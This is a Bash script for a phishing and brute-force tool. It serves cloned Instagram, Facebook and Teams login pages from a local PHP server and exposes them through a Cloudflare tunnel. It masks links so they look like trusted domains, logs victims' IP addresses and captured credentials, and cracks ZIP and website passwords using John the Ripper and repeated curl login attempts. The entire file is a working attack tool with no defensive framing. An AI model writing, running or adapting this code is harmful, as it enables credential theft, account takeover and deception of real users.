#!/bin/bash

# ANSI color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RESET='\033[0m'

# Create necessary directories
if [[ ! -d ".server" ]]; then
    mkdir -p ".server"
fi

if [[ ! -d "custom" ]]; then
    mkdir -p "custom"
fi

# Copy template files if they don't exist
if [[ ! -f "custom/index.html" ]]; then
    cp index.html custom/
fi

if [[ ! -f "custom/login.php" ]]; then
    cp login.php custom/
fi

# Server functions
setup_site() {
    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
    if [[ ! -d ".server" ]]; then
        mkdir -p ".server"
    fi
    cp -rf custom/* .server/
}

check_cloudflared() {
    if ! command -v cloudflared > /dev/null 2>&1; then
        echo -e "\n${RED}[${WHITE}!${RED}]${GREEN} Installing Cloudflared..."
        
        if [[ "$(uname -m)" == "aarch64" ]]; then
            wget -q 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' -O cloudflared
        else
            wget -q 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O cloudflared
        fi
        
        chmod +x cloudflared
        mv cloudflared /usr/local/bin
    fi
}

start_php_server() {
    cd .server
    php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
}

start_cloudflared() {
    if [[ -e ".cld.log" ]]; then
        rm -rf ".cld.log"
    fi
    
    cloudflared tunnel -url "http://127.0.0.1:8080" --logfile ".cld.log" > /dev/null 2>&1 &
    sleep 8
    
    if [[ -e ".cld.log" ]]; then
        cld_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
        echo -e "\n${GREEN}[+] Cloudflare Link:${WHITE} $cld_link ${RESET}"
    fi
}

start_local() {
    echo -e "\n${RED}[-]${GREEN} Starting PHP server...${RESET}"
    cd .server && php -S "127.0.0.1:8080" > /dev/null 2>&1 & 
    sleep 2
    echo -e "\n${GREEN}[+] PHP server started${RESET}"
    echo -e "\n${GREEN}[+] Local URL: ${WHITE}http://127.0.0.1:8080 ${RESET}"
    echo -e "\n${RED}[-]${YELLOW} Waiting for victim to open link...${RESET}"
}

start_internet() {
    echo -e "\n${RED}[-]${GREEN} Starting PHP server...${RESET}"
    start_php_server
    sleep 2
    echo -e "\n${RED}[-]${GREEN} Initializing Cloudflared...${RESET}"
    start_cloudflared
    
    echo -e "\n${YELLOW}[*] Want to mask the URL? (y/n):${RESET}"
    read mask_choice
    
    if [[ "$mask_choice" == "y" || "$mask_choice" == "Y" ]]; then
        echo -e "\n${YELLOW}[*] Enter custom domain (e.g., google-login):${RESET}"
        read custom_domain
        echo -e "\n${YELLOW}[*] Enter mask domain (e.g., google.com):${RESET}"
        read mask_domain
        
        masked_url="https://$mask_domain@$custom_domain"
        echo -e "\n${GREEN}[+] Masked URL:${WHITE} $masked_url ${RESET}"
    fi
    
    echo -e "\n${RED}[-]${YELLOW} Waiting for victim to open link...${RESET}"
}

capture_data() {
    echo -e "\n${YELLOW}[*] Waiting for login info...${RESET}"
    while true; do
        if [[ -e ".server/usernames.txt" ]]; then
            echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Activity Detected!"
            cat .server/usernames.txt
            rm -rf .server/usernames.txt
        fi
        sleep 0.1
    done
}

clear
echo -e "${RED}"
echo "██████╗ ██████╗ ██╗   ██╗████████╗███████╗"
echo "██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝"
echo "██████╔╝██████╔╝██║   ██║   ██║   █████╗  "
echo "██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  "
echo "██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗"
echo -e "╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝${RESET}"
echo
echo -e "${GREEN}██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ ${RESET}"
echo -e "${BLUE}██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗${RESET}"
echo -e "${RED}██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝${RESET}"
echo -e "${GREEN}██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${RESET}"
echo -e "${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${RESET}"
echo -e "${RED}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${RESET}"
echo
echo -e "${GREEN}[+] Created by: IVCODDER${RESET}"
echo -e "${BLUE}[+] Version: 1.0${RESET}"

echo
echo -e "${YELLOW}[*] Select an Option:${RESET}"
echo -e "${BLUE}[1]${RESET} Instagram"
echo -e "${BLUE}[2]${RESET} Facebook"
echo -e "${BLUE}[3]${RESET} Teams"
echo -e "${BLUE}[4]${RESET} Brute Force Attack"
echo

# Read user input
read -p $'\033[1;32m[+] Enter your choice (1-4): \033[0m' choice

# Process the choice
case $choice in
    1)
        echo -e "${GREEN}[+] Selected: Instagram${RESET}"
        echo -e "\n${YELLOW}[*] Select Attack Type:${RESET}"
        echo -e "${BLUE}[1]${RESET} Instagram Verification"
        echo -e "${BLUE}[2]${RESET} Instagram Followers"
        echo -e "${BLUE}[3]${RESET} Instagram Login"
        echo
        read -p $'\033[1;32m[+] Enter your choice (1-3): \033[0m' ig_type
        
        echo -e "\n${YELLOW}[*] Select Connection Type:${RESET}"
        echo -e "${BLUE}[1]${RESET} Local Network (Same WiFi)"
        echo -e "${BLUE}[2]${RESET} Over Internet"
        echo
        read -p $'\033[1;32m[+] Enter your choice (1-2): \033[0m' conn_type
        
        # Copy appropriate Instagram files based on selection
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
        if [[ ! -d ".server" ]]; then
            mkdir -p ".server"
        fi
        
        case $ig_type in
            1)
                cp -rf .sites/ig_verify/* .server/
                ;;
            2)
                cp -rf .sites/insta_followers/* .server/
                ;;
            3)
                cp -rf .sites/instagram/* .server/
                ;;
            *)
                echo -e "${RED}[-] Invalid option selected${RESET}"
                exit 1
                ;;
        esac
        
        case $conn_type in
            1)
                start_local
                capture_data
                ;;
            2)
                echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Starting PHP server..."
                cd .server && php -S "0.0.0.0:8080" > /dev/null 2>&1 & 
                
                check_cloudflared
                start_cloudflared
                
                # Wait for Cloudflare link to be generated
                while [ true ]; do
                    if [[ -e ".cld.log" ]]; then
                        cloudfl=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
                        if [[ ! -z "$cloudfl" ]]; then
                            echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Cloudflare Link: ${CYAN}$cloudfl"
                            break
                        fi
                    fi
                    sleep 0.5
                done
                
                # URL masking options
                echo -e "\n${RED}[${WHITE}1${RED}]${ORANGE} Continue with Original URL"
                echo -e "${RED}[${WHITE}2${RED}]${ORANGE} Apply URL Masking"
                read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' mask_choice

                if [[ $mask_choice == 2 ]]; then
                    echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Enter URL masking details"
                    read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter custom domain (e.g., instagram.com): \e[0m' mask_domain
                    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter words to mask (e.g., followers-increase): \e[0m' mask_words
                    
                    # Construct masked URL
                    masked_url="https://$mask_domain-$mask_words@${cloudfl#https://}"
                    echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Masked URL:${CYAN} $masked_url"
                fi
                
                echo -e "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for victim to open link...${BLUE}"
                
                # Monitor IP log file
                touch .server/ip.txt
                tail -f .server/ip.txt 2>/dev/null | while read ip; do
                    echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Target opened the link from IP:${CYAN} $ip"
                done &
                
                # Wait for credentials
                echo -e "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for login info, ${BLUE}Ctrl + C to exit..."
                capture_data
                ;;
            *)
                echo -e "${RED}[-] Invalid option selected${RESET}"
                exit 1
                ;;
        esac
        ;;
    2)
        echo -e "${GREEN}[+] Selected: Facebook${RESET}"
        echo -e "\n${YELLOW}[*] Select Connection Type:${RESET}"
        echo -e "${BLUE}[1]${RESET} Local Network (Same WiFi)"
        echo -e "${BLUE}[2]${RESET} Over Internet"
        echo
        read -p $'\033[1;32m[+] Enter your choice (1-2): \033[0m' conn_type
        
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
        if [[ ! -d ".server" ]]; then
            mkdir -p ".server"
        fi
        cp -rf .sites/facebook/* .server/
        
        case $conn_type in
            1)
                start_local
                capture_data
                ;;
            2)
                start_internet
                capture_data
                ;;
            *)
                echo -e "${RED}[-] Invalid option selected${RESET}"
                exit 1
                ;;
        esac
        ;;
    3)
        echo -e "${GREEN}[+] Selected: Microsoft Teams${RESET}"
        echo -e "\n${YELLOW}[*] Select Connection Type:${RESET}"
        echo -e "${BLUE}[1]${RESET} Local Network (Same WiFi)"
        echo -e "${BLUE}[2]${RESET} Over Internet"
        echo
        read -p $'\033[1;32m[+] Enter your choice (1-2): \033[0m' conn_type
        
        # Setup server directory
        rm -rf .server
        mkdir -p .server
        
        # Copy Teams template files
        cp -rf .sites/Teams/* .server/
        
        case $conn_type in
            1)
                start_local
                capture_data
                ;;
            2)
                start_internet
                capture_data
                ;;
            *)
                echo -e "${RED}[-] Invalid option selected${RESET}"
                exit 1
                ;;
        esac
        ;;
    4)
        echo -e "${GREEN}[+] Selected: Brute Force Attack${RESET}"
        echo -e "\n${YELLOW}[*] Select Attack Type:${RESET}"
        echo -e "${BLUE}[1]${RESET} ZIP File"
        echo -e "${BLUE}[2]${RESET} Website Login"
        echo
        read -p $'\033[1;32m[+] Enter your choice (1-2): \033[0m' bf_type
        
        case $bf_type in
            1)
                # Check if john is installed
                if ! command -v john &> /dev/null; then
                    echo -e "\n${RED}[${WHITE}!${RED}]${GREEN} Installing John the Ripper..."
                    apt-get install john -y
                fi
                
                echo -e "\n${YELLOW}[*] Enter ZIP File Details:${RESET}"
                read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter ZIP file path: \e[0m' zip_path
                read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter wordlist path: \e[0m' wordlist_path
                
                if [[ ! -f "$zip_path" ]]; then
                    echo -e "${RED}[-] ZIP file not found${RESET}"
                    exit 1
                fi
                
                if [[ ! -f "$wordlist_path" ]]; then
                    echo -e "${RED}[-] Wordlist file not found${RESET}"
                    exit 1
                fi
                
                echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Converting ZIP to John format..."
                zip2john "$zip_path" > hash.txt
                
                if [ ! -s hash.txt ]; then
                    echo -e "\n${RED}[${WHITE}!${RED}]${YELLOW} The ZIP file is not encrypted!${RESET}"
                    rm -f hash.txt
                    exit 1
                fi
                
                echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Starting brute force attack on ZIP file..."
                echo -e "${BLUE}[*]${WHITE} This might take a while depending on the wordlist size...${RESET}\n"
                
                # Run john with the wordlist
                john --wordlist="$wordlist_path" hash.txt
                
                # Show the cracked password
                result=$(john --show hash.txt)
                if [ -n "$result" ]; then
                    password=$(echo "$result" | cut -d ':' -f 2)
                    echo -e "\n${GREEN}[✓] Password found:${WHITE} $password${RESET}"
                else
                    echo -e "\n${RED}[-] Password not found in wordlist${RESET}"
                fi
                
                # Cleanup
                rm -f hash.txt
                ;;
                
            2)
                echo -e "\n${YELLOW}[*] Enter Website Details:${RESET}"
                read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter target URL (with http/https): \e[0m' target_url
                read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter username: \e[0m' username
                read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter wordlist path: \e[0m' wordlist_path
                
                if [[ ! -f "$wordlist_path" ]]; then
                    echo -e "${RED}[-] Wordlist file not found${RESET}"
                    exit 1
                fi
                
                echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Starting brute force attack on website..."
                
                # Read passwords from wordlist and try them one by one
                while IFS= read -r password; do
                    echo -e "${BLUE}[*]${WHITE} Trying password: $password"
                    
                    # Send POST request and check response
                    response=$(curl -s -w "%{http_code}" -d "username=$username&password=$password" \
                             -X POST "$target_url/login.php")
                    
                    # Check if we were redirected to success.html
                    if echo "$response" | grep -q "Login Successful"; then
                        echo -e "\n${GREEN}[✓] Password found:${WHITE} $password${RESET}"
                        break
                    fi
                    
                    # Add small delay to prevent overwhelming server
                    sleep 0.1
                done < "$wordlist_path"
                ;;
                
            *)
                echo -e "${RED}[-] Invalid option selected${RESET}"
                exit 1
                ;;
        esac
        ;;
    *)
        echo -e "${RED}[-] Invalid option selected${RESET}"
        exit 1
        ;;
esac 